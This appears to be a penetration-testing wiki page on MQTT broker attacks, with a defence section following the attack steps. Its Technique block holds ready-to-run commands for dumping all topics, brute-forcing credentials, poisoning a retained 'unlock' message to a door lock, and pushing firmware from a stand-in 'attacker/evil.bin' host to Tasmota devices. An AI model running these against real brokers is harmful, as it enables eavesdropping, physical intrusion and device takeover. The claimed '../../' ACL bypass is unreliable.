---
title: MQTT Broker Attacks
slug: mqtt-attacks
---

> **TL;DR:** Mosquitto and other MQTT brokers on 1883 (and 8883 TLS) frequently allow anonymous subscribes to the `#` wildcard, which streams every IoT message in the building to anyone listening.

## What it is
MQTT is a lightweight pub/sub protocol that has become the default transport for IoT, building automation, smart-home hubs, and small ICS deployments. Topics are arranged in a slash-hierarchy and clients subscribe with wildcards (`+` single level, `#` multi-level). Brokers default to `allow_anonymous true` in older Mosquitto versions and many vendor builds, so an attacker with TCP reach to the broker can read and write every topic.

## Preconditions / where it applies
- TCP/1883 plaintext, TCP/8883 TLS, sometimes 9001 for MQTT-over-WebSocket
- Default Mosquitto < 2.0 allowed anonymous; 2.0+ requires explicit opt-in
- Found on building HVAC dashboards, Home Assistant, Tasmota, Zigbee2MQTT gateways, factory floor SCADA bridges
- ACLs are often misconfigured: a topic prefix like `house/+/cmd` can be bypassed with `house/+/cmd/../../admin`

## Technique
```bash
# Fingerprint and grab broker version
nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.40

# Full broker dump — subscribe to root wildcard
mosquitto_sub -h 10.0.0.40 -p 1883 -t '#' -v
mosquitto_sub -h 10.0.0.40 -p 8883 --cafile ca.crt -t '$SYS/#' -v   # internal stats

# Brute creds if anonymous is off
ncrack -p 1883 --user admin -P rockyou.txt 10.0.0.40

# Retained-message poisoning — survives broker restart, replayed to every new subscriber
mosquitto_pub -h 10.0.0.40 -t 'home/lock/cmd' -m 'unlock' -r -q 1

# Inject malicious firmware-update topic on Tasmota fleet
mosquitto_pub -h 10.0.0.40 -t 'cmnd/tasmota_+/Upgrade' -m 'http://attacker/evil.bin'

# WebSocket variant
wscat -c ws://10.0.0.40:9001/mqtt -s mqttv3.1
```

## Detection and defence
- Mosquitto 2.0+ — `allow_anonymous false` is the default, set strong listeners
- Per-client ACL file: `topic readwrite house/%c/#` to scope each device to its own subtree
- Require TLS on 8883 and client-certificate auth for production fleets
- Monitor `$SYS/broker/clients/connected` for unexpected jumps
- Network: do not expose 1883 to the internet — Shodan finds ~100k brokers in the open

## References
- [Mosquitto 2.0 release notes](https://mosquitto.org/blog/2020/12/version-2-0-0-released/) — anonymous off by default
- [OWASP IoT MQTT cheat sheet](https://owasp.org/) — ACL and TLS guidance

See also: [[exposed-services]], [[port-scanning]].
